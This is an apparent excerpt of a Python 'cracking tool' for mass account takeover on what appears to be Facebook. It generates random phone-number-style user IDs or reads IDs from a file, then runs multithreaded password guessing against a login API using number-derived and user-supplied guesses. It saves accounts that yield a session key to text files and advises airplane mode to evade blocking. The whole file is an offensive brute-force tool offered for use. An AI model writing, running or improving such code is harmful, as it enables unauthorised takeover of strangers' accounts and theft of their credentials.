...
\033[1;31;1m #    # #     # ######  ### #     #                                     
\033[1;34;1m-----------------------------------------------
\033[1;37;1m  Author   : KABIR [{G}RIDER{W}]
\033[1;37;1m  Facebook : https://facebook.com/KABIRSINGH2119
...
def infinty():
    ...
    print(f'{G}      WELCOME TO KABIR CRACKING TOOL.....{W} ')
    Ariish()
    print(f'{W}[1] Random Crack')
    print(f'{W}[2] File Crack')
    print(f'{W}[0] Exit Tool')
    Ariish()
    EvilX = input(f'{W}[?] Choose : ')
    if EvilX in ['1','01']:
        random_number()
    elif EvilX in ['2','02']:
        file_crack()
        ...
        print(f'{W}[{G}℅{W}] select one option ')
#______[ RANDOM NUMBER CRACK ]______>>
def random_number():
    Annu()
    print(f'{G}          RONDOM NUMBER CRACKING.....{W} ')
    Ariish()
    code = input(f"{W}[+] Input Number Code : {G}")
    try:
        limit = int(input(f"{W}[+] Input Limit Crack : {G}"))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = ['first6digit,''last6digit','fullnumber','57273200','full_number']
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(user_ID))
        Annu()
        print(f"{W}[+] Total Ids : {G}{total}")
        print(f"{W}[+] Code for UID Dump : {G}{str(code)}")
        print(f"{W}[+] Total Password for Crack : {G}{str(len(pwx))}")
        print(f'{W}[$] Brute Has been started...({B}India{W})')
        Ariish()
        print(f'{W}    USE FLIGHT ({R}AIRPLANE{W}) MODE BEFORE USE{W}')
        Ariish()
        for user in user_ID:
            uid = code+user
            BilalHaiderID.submit(bapi,uid,pwx,total)
    Ariish()
    print(f"\n{W}[+] Process Has Been Completed")
    print(f"{W}[+] Total Ids : {G}{len(oks)} ")
    Ariish()
    print(f"{W} Press Inter To Back Menu.....")
    infinty()
#___________[ FILE CLONING OLD / NEW ]__________>>
def file_crack():
    Annu()
    print(f'\t{G}        FILE CRACKING.....{W} ')
    Ariish()
    fileX = input(f"{W}[+] Input File Path : {G}")
    Ariish()
    try:
    ...
    try:
        limit = int(input(f"{W}[?] Input Password Limit : {G}"))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    Annu()
    print(f"{W}[+] Example : {G}first last - firstlast")
    print(f"{W}[+]  Example : {G}first123 - last1234")
    print(f"{W}[+]  Example : {G}firstlast123 - 786786 - khankhan")
    Ariish()
    for i in range(limit):
        password = input(f"{W}[{str(i+1)}] Input Password : {G}")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as BilalHaiderID:
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r{W}[{G}KABIR{W}] [{len(cracked)}/{total}] [{G}{len(oks)}{W}/{Y}{len(cps)}{W}] ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{G}[KABIR_OK] {uidX} | {pw} {W}')
                    open('/sdcard/KABIR_OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{Y}[KABIR_CP] {uid} | {pw} {W}')
                    open('/sdcard/KABIR_CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{G}[KABIR_OK] {uid} | {pw} {W}')
                    open('/sdcard/KABIR_OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
...
if __name__=="__main__":
     infinty()
     #bapif("100034118766868|KABIR SINGH",["4292416"],"2222")
